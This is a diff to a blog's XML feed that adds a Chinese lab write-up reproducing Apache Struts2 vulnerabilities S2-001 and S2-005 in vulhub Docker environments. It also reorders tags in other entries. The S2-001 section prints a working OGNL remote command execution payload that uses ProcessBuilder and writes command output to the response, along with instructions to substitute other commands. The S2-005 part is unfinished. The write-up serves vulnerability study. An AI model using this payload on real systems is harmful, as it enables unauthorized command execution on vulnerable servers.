@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Struts2系列漏洞复现</title>
+      <link href="/2022/05/04/Struts/"/>
+      <url>/2022/05/04/Struts/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Struts2系列漏洞复现"><a href="#Struts2系列漏洞复现" class="headerlink" title="Struts2系列漏洞复现"></a>Struts2系列漏洞复现</h1><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts 2.0.0 - Struts 2.0.8</p></blockquote><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-001docker-compose up -d</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>开始测试</p><p><img src="/2022/05/04/Struts/image-20220504194156399.png" alt="image-20220504194156399"></p><p>一开始长这个样子</p><p>输入代码</p><pre><code>%&#123;1+1&#125;</code></pre><p><img src="/2022/05/04/Struts/image-20220504194301478.png" alt="image-20220504194301478"></p><p>成功执行</p><p><img src="/2022/05/04/Struts/image-20220504194315328.png" alt="image-20220504194315328"></p><p>获取tomcat路径</p><pre class=" language-Linux"><code class="language-Linux">%&#123;"tomcatBinDir&#123;"+@java.lang.System@getProperty("user.dir")+"&#125;"&#125;</code></pre><p><img src="/2022/05/04/Struts/image-20220504194652923.png" alt="image-20220504194652923"></p><p>出来了</p><p>构造命令语句，太长了上burpsuite</p><pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p>使用其他的命令替换上面的<code>ls</code>就好了</p><p>在用之前要进行url编码，选中文本<code>Ctrl+u</code></p><p><img src="/2022/05/04/Struts/image-20220504195024232.png" alt="image-20220504195024232"></p><p>下一个</p><h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。<br>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p></blockquote><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts 2.0.0 - Struts 2.1.8.1</p></blockquote><h3 id="靶场搭建-1"><a href="#靶场搭建-1" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-005docker-compose up -d</code></pre><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p><img src="/2022/05/04/Struts/image-20220504205347532.png" alt="image-20220504205347532"></p><p>确实不知道怎么搞</p><p>用k8扫描一下</p><p><img src="/2022/05/04/Struts/image-20220504210156669.png" alt="image-20220504210156669"></p><p>确实是有，但是我不知道原理，先放着</p><p><img src="/2022/05/04/Struts/image-20220504210215429.png" alt="image-20220504210215429"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>综合实战第三章-日志注入实战</title>
       <link href="/2022/05/03/theEther/"/>
       <url>/2022/05/03/theEther/</url>
@@ -700,11 +731,11 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
             
             <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> CVE </tag>
             
@@ -731,11 +762,11 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
             
             <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> Apache </tag>
             
@@ -764,9 +795,9 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> Linux </tag>
             
